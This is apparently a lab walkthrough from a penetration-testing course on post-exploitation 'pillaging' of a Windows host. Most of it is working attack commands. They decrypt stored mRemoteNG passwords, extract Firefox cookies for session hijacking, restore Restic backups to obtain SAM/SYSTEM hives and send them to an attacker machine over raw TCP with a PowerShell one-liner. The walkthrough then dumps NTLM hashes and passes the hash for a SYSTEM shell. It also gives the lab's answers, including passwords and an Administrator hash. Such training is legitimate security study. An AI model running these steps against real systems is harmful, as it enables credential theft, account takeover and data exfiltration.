# Section 26 — Pillaging

> **Lab: yes** — RDP to target, extract credentials from installed applications (mRemoteNG, Firefox), discover and restore Restic backups, dump hashes from restored SAM/SYSTEM hives, pass-the-hash as Administrator.

**Core principle:** After gaining access to a system, pillage it for credentials, cookies, configs, and backups. Installed applications often store credentials in recoverable formats. Backup systems may contain copies of sensitive files (SAM/SYSTEM hives) that yield local account hashes. Every user profile is a potential goldmine.

---

## Installed applications — credential extraction

### mRemoteNG

mRemoteNG stores connection configs (including encrypted passwords) in an XML file.

#### Find the config

```cmd
dir /s /b C:\Users\*confCons.xml
```
> Default location: `C:\Users\<USER>\AppData\Roaming\mRemoteNG\confCons.xml`

#### Read the config

```cmd
type "C:\Users\<USER>\AppData\Roaming\mRemoteNG\confCons.xml"
```
> Look for `Password="<base64-encoded-string>"` attributes on connection nodes. Also note the `Username` and `Domain` fields for context on whose credentials these are.

#### Decrypt the password

```bash
# Clone the decryption tool
git clone https://github.com/gquere/mRemoteNG-Decrypt.git /tmp/mRemoteNG-Decrypt

# Decrypt
python3 /tmp/mRemoteNG-Decrypt/mremoteng_decrypt.py -s "<base64_password_string>"
```
> mRemoteNG uses AES-128-GCM with a known default key. The tool handles decryption automatically. If a custom master password was set, use `-p <master_password>`.

---

### Firefox — cookie extraction

Firefox stores cookies in a SQLite database that can be used for session hijacking.

#### Find the cookie database

```cmd
dir /s /b C:\Users\*cookies.sqlite
```
> Located in Firefox profile directories: `C:\Users\<USER>\AppData\Roaming\Mozilla\Firefox\Profiles\<random>.default-release\cookies.sqlite`

#### Copy and query the database

Copy `cookies.sqlite` to your Kali machine, then:

```bash
sqlite3 cookies.sqlite "SELECT host, name, value FROM moz_cookies WHERE name='d' OR host LIKE '%slack%' OR host LIKE '%github%'"
```
> The `d` cookie for Slack, session cookies for GitHub/Jira/etc. — any of these can be injected into your browser for session hijacking.

#### Use the cookie

1. Open the target site in your browser
2. Open Developer Tools → Storage/Application → Cookies
3. Add/modify the cookie name and value
4. Refresh the page — you're now authenticated as that user

---

### Other applications to check

| Application | Config Location | What to Extract |
|-------------|----------------|-----------------|
| **mRemoteNG** | `AppData\Roaming\mRemoteNG\confCons.xml` | Encrypted passwords (AES, known default key) |
| **PuTTY** | Registry `HKCU\Software\SimonTatham\PuTTY\Sessions` | Saved session configs, proxy passwords |
| **FileZilla** | `AppData\Roaming\FileZilla\recentservers.xml` | Plaintext FTP credentials |
| **WinSCP** | Registry `HKCU\Software\Martin Prikryl\WinSCP 2\Sessions` | Encrypted passwords (weak encryption) |
| **KeePass** | `.kdbx` files anywhere on disk | Master DB (need master password/keyfile) |
| **Chrome** | `AppData\Local\Google\Chrome\User Data\Default\Login Data` | Encrypted passwords (DPAPI) |
| **Firefox** | `AppData\Roaming\Mozilla\Firefox\Profiles\*\logins.json` + `key4.db` | Encrypted passwords |
| **Slack** | `AppData\Roaming\Slack\storage\` | Tokens, cookies |
| **Microsoft Teams** | `AppData\Roaming\Microsoft\Teams\` | Auth tokens in LevelDB |
| **Outlook** | `AppData\Local\Microsoft\Outlook\*.ost` | Cached emails, contacts |

---

## Backup systems — Restic

### What is Restic?

Restic is a backup program that creates encrypted, deduplicated snapshots. If you find a Restic repo and its password, you can restore any snapshot — potentially recovering SAM/SYSTEM hives, NTDS.dit, or other sensitive files from previous backups.

### Find Restic configuration

Look for backup configs, scripts, or notes on user Desktops:

```cmd
dir /s /b C:\Users\*backup*
dir /s /b C:\Users\*restic*
```
> Check for config files containing the repo path and password. In the lab, `C:\Users\Jeff\Desktop\backup conf.txt` contained the repo path (`E:\restic`) and password (`Superbackup!`).

### List snapshots

```cmd
restic -r E:\restic snapshots
```
> Enter the repo password when prompted. This shows all available backup snapshots with timestamps and paths.

### Restore a snapshot

```cmd
restic -r E:\restic restore <SNAPSHOT_ID> --target C:\Users\Jeff\Desktop\Restore
```
> Restores the full snapshot to the target directory. Look for `Windows\System32\config\` containing SAM, SYSTEM, and SECURITY hives.

---

## Extracting hashes from SAM/SYSTEM hives

### Transfer files to Kali

The restored SAM/SYSTEM files need to get to your Kali machine for hash extraction. Direct SMB copy often fails due to permissions. Use raw TCP transfer:

**On Kali:**
```bash
mkdir -p /tmp/loot
nc -lvnp 8443 > /tmp/loot/SAM
```

**On target (PowerShell):**
```powershell
$d=[IO.File]::ReadAllBytes('C:\path\to\SAM');$c=New-Object Net.Sockets.TcpClient('KALI_IP',8443);$s=$c.GetStream();$s.Write($d,0,$d.Length);$s.Close();$c.Close()
```
> Repeat for SYSTEM file (restart nc listener first). This bypasses SMB permission issues entirely.

**Why SMB copy fails:** Even with an authenticated SMB share (`smbserver.py -smb2support -username user -password pass`), Windows may block writes due to security policies or file permission inheritance from the backup.

### Dump hashes with secretsdump

```bash
secretsdump.py -sam /tmp/loot/SAM -system /tmp/loot/SYSTEM LOCAL
```
> Extracts all local account NTLM hashes. Output format: `username:RID:lmhash:nthash:::`. The SYSTEM hive provides the bootKey needed to decrypt the SAM.

### Pass-the-Hash as Administrator

```bash
psexec.py administrator@<TARGET_IP> -hashes aad3b435b51404eeaad3b435b51404ee:<NTHASH>
```
> Or use `evil-winrm -i <TARGET_IP> -u administrator -H <NTHASH>`. Gives you a SYSTEM shell on the target.

---

## File transfer methods for restricted environments

When standard copy/SMB fails, these alternatives work:

| Method | Command (Target) | Command (Kali) | Best For |
|--------|-------------------|-----------------|----------|
| **Raw TCP (nc)** | `powershell "$d=[IO.File]::ReadAllBytes('file');$c=New-Object Net.Sockets.TcpClient('IP',PORT);$s=$c.GetStream();$s.Write($d,0,$d.Length);$s.Close()"` | `nc -lvnp PORT > file` | Any file size, reliable |
| **Base64 + certutil** | `certutil -encode file output.b64` | Decode: `base64 -d file.b64 > file` | Small files (<1MB) |
| **HTTP upload** | `powershell Invoke-WebRequest -Uri http://IP:PORT/upload -Method POST -InFile file` | `python3 -m uploadserver PORT` | Medium files |
| **Impacket SMB (authenticated)** | `net use Z: \\IP\share /user:user pass && copy file Z:\` | `smbserver.py -smb2support -username user -password pass share /path/` | When SMB isn't blocked |

---

## Lab walkthrough

**Target:** `<TARGET_IP>`
**RDP Creds:** `htb-student` / `HTB_@cademy_stdnt!`

### Attack chain

```
┌──────────────────────────────────────────────────────────────┐
│ VARIABLES — edit these for your instance                     │
├──────────────────────────────────────────────────────────────┤
│ TARGET_IP     = <TARGET_IP>                                  │
│ KALI_TUN0_IP  = (your tun0 IP)                               │
│ RDP_USER      = htb-student                                  │
│ RDP_PASS      = HTB_@cademy_stdnt!                           │
└──────────────────────────────────────────────────────────────┘

STEP 1: CONNECT
───────────────
1. RDP to target
   xfreerdp3 /cert:ignore /dynamic-resolution +clipboard /compression /v:<TARGET_IP> /u:htb-student /p:'HTB_@cademy_stdnt!'

STEP 2: mRemoteNG CREDENTIALS (Q1-Q2)
──────────────────────────────────────
2. Check for mRemoteNG
   dir "C:\Program Files (x86)\mRemoteNG"
   → Confirms mRemoteNG is installed

3. Find and read confCons.xml
   type "C:\Users\Peter\AppData\Roaming\mRemoteNG\confCons.xml"
   → Contains Grace's encrypted password in the Password= attribute

4. Decrypt the password on Kali
   git clone https://github.com/gquere/mRemoteNG-Decrypt.git /tmp/mRemoteNG-Decrypt
   python3 /tmp/mRemoteNG-Decrypt/mremoteng_decrypt.py -s "<base64_password>"
   → Q1: The name of the application (mRemoteNG)
   → Q2: Grace's cleartext password (Princess01!)

STEP 3: FIREFOX COOKIES (Q3)
─────────────────────────────
5. RDP as Grace
   xfreerdp3 /cert:ignore /dynamic-resolution +clipboard /compression /v:<TARGET_IP> /u:Grace /p:'Princess01!'

6. Find and examine cookies.sqlite
   dir /s /b C:\Users\Grace\*cookies.sqlite
   → Copy cookies.sqlite to Kali (use nc TCP transfer)
   
   On Kali:
   sqlite3 cookies.sqlite "SELECT name, value FROM moz_cookies WHERE host LIKE '%slack%'"
   → Q3: The cookie value from the d cookie for Slack

STEP 4: RESTIC BACKUP DISCOVERY (Q4)
─────────────────────────────────────
7. RDP as Jeff (Webmaster001!)
   xfreerdp3 /cert:ignore /dynamic-resolution +clipboard /compression /v:<TARGET_IP> /u:Jeff /p:'Webmaster001!'

8. Find backup configuration
   type "C:\Users\Jeff\Desktop\backup conf.txt"
   → Contains: Repo path = E:\restic, Password = Superbackup!

9. List and restore snapshots
   restic -r E:\restic snapshots
   → Pick a snapshot containing Windows\System32\config
   
   restic -r E:\restic restore <SNAPSHOT_ID> --target C:\Users\Jeff\Desktop\Restore
   → Q4: The restic repository password (Superbackup!)

STEP 5: EXTRACT ADMINISTRATOR HASH (Q5)
────────────────────────────────────────
10. Verify restored files
    dir "C:\Users\Jeff\Desktop\Restore\C\Windows\System32\config"
    → Should contain SAM (64KB) and SYSTEM (16MB)

11. Transfer SAM to Kali via raw TCP
    Kali:   nc -lvnp 8443 > /tmp/loot/SAM
    Target: powershell -c "$d=[IO.File]::ReadAllBytes('C:\Users\Jeff\Desktop\Restore\C\Windows\System32\config\SAM');$c=New-Object Net.Sockets.TcpClient('KALI_IP',8443);$s=$c.GetStream();$s.Write($d,0,$d.Length);$s.Close();$c.Close()"
    → nc exits when transfer completes

12. Transfer SYSTEM to Kali via raw TCP
    Kali:   nc -lvnp 8443 > /tmp/loot/SYSTEM
    Target: powershell -c "$d=[IO.File]::ReadAllBytes('C:\Users\Jeff\Desktop\Restore\C\Windows\System32\config\SYSTEM');$c=New-Object Net.Sockets.TcpClient('KALI_IP',8443);$s=$c.GetStream();$s.Write($d,0,$d.Length);$s.Close();$c.Close()"

    → Why raw TCP? SMB copy fails even with authenticated shares due to
      Windows security policies. certutil base64 works for SAM (64KB) but
      SYSTEM (16MB) is impractical. Raw TCP bypasses all of this.

13. Dump hashes on Kali
    secretsdump.py -sam /tmp/loot/SAM -system /tmp/loot/SYSTEM LOCAL
    → Q5: Administrator NTLM hash (bac9dc5b7b4bec1d83e0e9c04b477f26)

OPTIONAL: PASS-THE-HASH
────────────────────────
14. Use the Administrator hash to get a shell
    psexec.py administrator@<TARGET_IP> -hashes aad3b435b51404eeaad3b435b51404ee:bac9dc5b7b4bec1d83e0e9c04b477f26
    → SYSTEM shell on the target
```

---

## Key takeaways

- **Check every user profile for installed applications.** mRemoteNG, FileZilla, PuTTY, WinSCP — all store credentials in recoverable formats.
- **mRemoteNG uses AES with a known default key.** The confCons.xml password field is trivially decryptable unless a custom master password was set.
- **Firefox cookies.sqlite enables session hijacking.** Copy the DB, query for session cookies (Slack `d` cookie, GitHub sessions), inject into your browser.
- **Backup systems are goldmines.** Restic, Veeam, Windows Backup — if you find the repo and password, you can restore SAM/SYSTEM hives from any point in time.
- **SAM + SYSTEM = local account NTLM hashes.** Use `secretsdump.py -sam SAM -system SYSTEM LOCAL` to extract them offline.
- **Raw TCP transfer (nc + PowerShell) is the most reliable file exfil method** when SMB copy and other methods fail due to permissions.
- **Pass-the-Hash with the Administrator NTLM hash** gives you full SYSTEM access via psexec.py, wmiexec.py, or evil-winrm.
